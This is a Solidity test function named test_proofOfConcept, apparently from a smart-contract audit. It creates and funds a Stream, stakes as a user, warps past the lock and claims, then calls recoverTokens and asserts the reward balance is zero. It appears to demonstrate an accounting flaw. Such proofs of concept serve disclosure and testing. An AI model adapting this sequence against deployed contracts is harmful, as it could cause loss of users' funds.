function test_proofOfConcept() public {
        (
            uint32 maxDepositLockDuration,
            uint32 maxRewardLockDuration,
            uint32 maxStreamDuration,
            uint32 minStreamDuration
        ) = defaultStreamFactory.streamParams();

        uint32 startTime = uint32(block.timestamp + 10);

        uint32 endStream = startTime + minStreamDuration;
        uint32 endDepositLock = endStream + maxDepositLockDuration;
        uint32 endRewardLock = endStream + 0;
        {
            Stream stream = defaultStreamFactory.createStream(
                address(testTokenA),
                address(testTokenB),
                startTime,
                minStreamDuration,
                maxDepositLockDuration,
                0,
                false
            );

            testTokenA.approve(address(stream), type(uint256).max);
            stream.fundStream(1000000);
            bob.doStake(stream, address(testTokenB), 1000000);

            emit log('rewardTokenAmount before claim');
            (uint112 rewardamt, uint112 depamt, uint112 fee, uint112 fashfee) = stream.tokenAmounts();
            emit log_uint(rewardamt);
            
            emit log('bob reward amount');
            emit log_uint(testTokenA.balanceOf(address(bob)));

            hevm.warp(endDepositLock + 1);
            bob.doClaimReward(stream);

            emit log('rewardTokenAmount after claim');
            ( rewardamt,  depamt,  fee,  fashfee) = stream.tokenAmounts();
            emit log_uint(rewardamt);

            emit log('bob reward amount');
            emit log_uint(testTokenA.balanceOf(address(bob)));
            
            
            stream.recoverTokens(address(testTokenA), address(bob));

            
            assertEq(rewardamt, 0);
            //hevm.warp(startTime - 10);
        }
    }
